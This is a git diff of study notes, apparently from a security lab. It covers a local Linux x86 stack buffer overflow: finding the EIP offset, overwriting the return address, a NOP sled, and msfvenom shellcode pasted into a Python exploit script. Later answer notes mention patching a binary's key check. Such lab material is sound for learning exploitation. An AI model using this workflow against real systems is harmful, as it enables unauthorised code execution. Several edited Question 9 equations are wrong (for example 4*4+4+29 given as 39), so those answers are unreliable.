@@ -270,16 +270,28 @@ print (offset)
 python linbuff.py | ./func (should crash it: Segmentation fault (core dumped))
 gdb ./func
 do run <<<$(python linbuff.py) (look what is overwritten) should see 0x41414141 in ?? ()
-quit and use wiremask.eu and make a pattern and put that in the script you made
-nano linbuf go back to the "A" * the number you got from wiremask
+quit and use wiremask.eu
+take the pattern and replace the "A" * 100 with your pattern
 ```
 #!/usr/bin/env python
 
-offset = "A" * 62
+offset = "<Wiremask Pattern>"
+
+print(offset)
+```
+gdb ./func
+do run <<<$(python linbuff.py)
+the new address in ?? () gets put into wiremask to find the offset
+take your offset and set it back to "A" * <offset>
+```
+#!/usr/bin/env python
+
+offset = "A" * <offset>
 test = "BBBB"
 
 print(offset + test)
 ```
+gdb ./func
 run <<<$(python linbuff.py) should get 0x42424242
 env - gbd ./func
 show env
@@ -295,17 +307,17 @@ nano linbuff.py
 ```
 #!/usr/bin/env python
 
-offset = "A" * 62
+offset = "A" * <offset>
 #test = "BBBB"
 #<0xf7de3b59>
 
-eip = \x59\x3b\xde\xf7
+eip = "\x59\x3b\xde\xf7"
 
 nop = "\x90" * 15
 
 print(offset + eip + nop)
 ```
-msfvenom -p linux/x86/exec CMD=whoami -b "\x00" -f python
+@lin-ops:~$ msfvenom -p linux/x86/exec CMD=whoami -b "\x00" -f python
 take the output and copy it to linbuff bellow nop and add buf
 ```
 #!/usr/bin/env python
@@ -314,7 +326,7 @@ offset = "A" * 62
 #test = "BBBB"
 #<0xf7de3b59>
 
-eip = \x59\x3b\xde\xf7
+eip = "\x59\x3b\xde\xf7"
 
 nop = "\x90" * 15
 
@@ -663,18 +675,20 @@ Question 8:
 
 Question 9:
 	2 * 2 + 2 + 29 = 35
-	3 * 2 + 2 + 29 = 37
-	4 * 2 + 2 + 29 = 39
-	5 * 2 + 2 + 29 = 41
-	6 * 2 + 2 + 29 = 43
-	7 * 2 + 2 + 29 = 45
-	8 * 2 + 2 + 29 = 47
-	9 * 2 + 2 + 29 = 49
-	10 * 2 + 2 + 29 = 51
-	11 * 2 + 2 + 29 = 53
+	3 * 3 + 3 + 29 = 41
+	4 * 4 + 4 + 29 = 39
+	5 * 5 + 5 + 29 = 41
+	6 * 6 + 6 + 29 = 43
+	7 * 7 + 7 + 29 = 45
+	8 * 8 + 8 + 29 = 47
+	9 * 9 + 9 + 29 = 49
+	10 * 10 + 10 + 29 = 51
+	11 * 11 + 11 + 29 = 53
 
 Question 10:
-	
+	        004010bc c7 45 e4        MOV        dword ptr [EBP + local_20],0x17
+                 17 00 00 00
+	learn to hardcode a master key in bytes and a jmp instruction to a success path 
 
 Question 11:
 	
